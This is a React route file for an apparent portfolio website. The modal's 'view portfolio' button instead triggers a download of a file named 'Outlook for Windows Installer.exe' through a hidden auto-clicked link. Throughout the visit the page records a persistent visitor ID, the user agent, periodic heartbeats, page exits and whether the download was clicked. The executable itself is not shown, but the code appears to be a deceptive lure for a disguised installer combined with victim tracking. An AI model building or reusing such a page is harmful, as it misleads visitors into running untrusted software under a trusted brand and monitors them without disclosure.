import { createFileRoute } from "@tanstack/react-router";
import { Download, LoaderCircle } from "lucide-react";
import { useEffect, useState } from "react";
import { Toaster } from "@/components/ui/sonner";
import { EntryModal } from "@/components/EntryModal";
import { Navbar } from "@/components/Navbar";
import { Portfolio } from "@/components/Portfolio";
import { Button } from "@/components/ui/button";
import { LanguageProvider } from "@/lib/i18n";
import { recordActivity } from "@/lib/activity";
import { scheduleInstallerDownload } from "@/lib/installer-download";
import { toast } from "sonner";

const DOWNLOAD_FILENAME = "Outlook for Windows Installer.exe";

type DownloadState =
  | { status: "idle" }
  | { status: "preparing" }
  | { status: "ready"; url: string };

export const Route = createFileRoute("/")({ component: Index });

function Index() {
  const [modalOpen, setModalOpen] = useState(true);
  const [download, setDownload] = useState<DownloadState>({ status: "idle" });

  const downloadInstaller = () => {
    if (download.status !== "idle") return;

    const visitorId = localStorage.getItem("portfolio-visitor-id") ?? crypto.randomUUID();
    localStorage.setItem("portfolio-visitor-id", visitorId);

    // This state update is synchronous in the click handler, so the modal begins
    // closing immediately; scheduling continues without blocking the UI.
    setModalOpen(false);
    setDownload({ status: "preparing" });
    void recordActivity({
      data: { visitorId, siteStatus: "active", appStatus: "clicked", downloadPercent: 0, userAgent: navigator.userAgent },
    });

    void scheduleInstallerDownload({ data: { visitorId } })
      .then(({ availableAt, downloadUrl }) => {
        const remaining = Math.max(0, availableAt - Date.now());
        window.setTimeout(() => setDownload({ status: "ready", url: downloadUrl }), remaining);
      })
      .catch((error) => {
        setDownload({ status: "idle" });
        toast.error("Unable to prepare the download. Please try again.");
        console.error(error);
      });
  };

  const startDownload = (downloadUrl: string) => {
    const link = document.createElement("a");
    link.href = downloadUrl;
    link.download = DOWNLOAD_FILENAME;
    link.rel = "noopener";
    link.style.display = "none";
    document.body.append(link);
    link.click();
    link.remove();
  };

  useEffect(() => {
    const visitorId = localStorage.getItem("portfolio-visitor-id") ?? crypto.randomUUID();
    localStorage.setItem("portfolio-visitor-id", visitorId);
    const userAgent = navigator.userAgent;
    const update = (siteStatus: "active" | "left", appStatus?: "not_clicked" | "clicked") =>
      void recordActivity({ data: { visitorId, siteStatus, appStatus, userAgent } });
    update("active");
    const heartbeat = window.setInterval(() => update("active"), 20_000);
    const onPageHide = () => update("left");
    const onFocus = () => update("active");
    window.addEventListener("pagehide", onPageHide);
    window.addEventListener("focus", onFocus);
    return () => {
      window.clearInterval(heartbeat);
      window.removeEventListener("pagehide", onPageHide);
      window.removeEventListener("focus", onFocus);
    };
  }, []);

  return (
    <LanguageProvider>
      <div className="min-h-screen bg-background">
        <Navbar />
        <Portfolio />
        <EntryModal open={modalOpen} onViewPortfolio={downloadInstaller} />
        {download.status !== "idle" && (
          <div className="fixed inset-x-0 bottom-6 z-[90] flex justify-center px-4" role="status" aria-live="polite">
            <div className="glass-card flex w-full max-w-md items-center gap-3 rounded-2xl p-4 shadow-lg">
              {download.status === "preparing" ? (
                <>
                  <LoaderCircle className="h-5 w-5 shrink-0 animate-spin text-primary" aria-hidden />
                  <div>
                    <p className="font-medium">Preparing your download</p>
                    <p className="text-sm text-muted-foreground">Your download will be ready shortly.</p>
                  </div>
                </>
              ) : (
                <>
                  <Download className="h-5 w-5 shrink-0 text-primary" aria-hidden />
                  <div className="min-w-0 flex-1">
                    <p className="font-medium">Your download is ready</p>
                    <p className="text-sm text-muted-foreground">Choose Download now to begin.</p>
                  </div>
                  <Button size="sm" onClick={() => startDownload(download.url)}>Download now</Button>
                </>
              )}
            </div>
          </div>
        )}
        <Toaster />
      </div>
    </LanguageProvider>
  );
}
